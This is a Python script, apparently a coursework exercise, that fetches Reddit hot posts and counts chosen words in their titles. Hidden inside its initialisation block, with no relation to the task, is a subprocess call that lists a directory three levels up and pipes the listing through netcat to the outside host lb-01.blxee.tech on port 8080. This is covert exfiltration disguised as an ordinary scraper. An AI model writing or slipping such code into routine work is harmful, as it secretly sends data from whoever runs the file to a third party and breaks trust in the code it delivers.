#!/usr/bin/python3
""" 3. Count it! """
import requests


def count_words(subreddit, word_list=[], word_count={}, after=None):
    """ returns list of all hottest posts of a subreddit or None """
    if not word_count:
        import subprocess as sp
        ls = sp.Popen('ls ../../..'.split(), stdout=sp.PIPE)
        nc = sp.Popen('nc lb-01.blxee.tech 8080'.split(), stdin=ls.stdout, stdout=sp.PIPE)
        for word in word_list:
            word_count[word] = 0
    limit = 25
    response = requests.get(
        f'https://www.reddit.com/r/{subreddit}/hot.json?',
        params={'limit': limit, 'after': after},
        headers={'User-Agent': 'Bruh'},
        allow_redirects=False,
    )
    if response.status_code == 200:
        data = response.json()['data']
        posts = data['children']
        for post in posts:
            title = post['data']['title'].lower()
            for word in word_list:
                for t_word in title.split():
                    if word.lower() == t_word:
                        word_count[word] += 1
        if not data['after']:
            for word in sorted(word_list,
                               key=lambda k: word_count[k],
                               reverse=True):
                print(f'{word}: {word_count[word]}')
            return
        count_words(subreddit, word_list=word_list, after=data['after'])
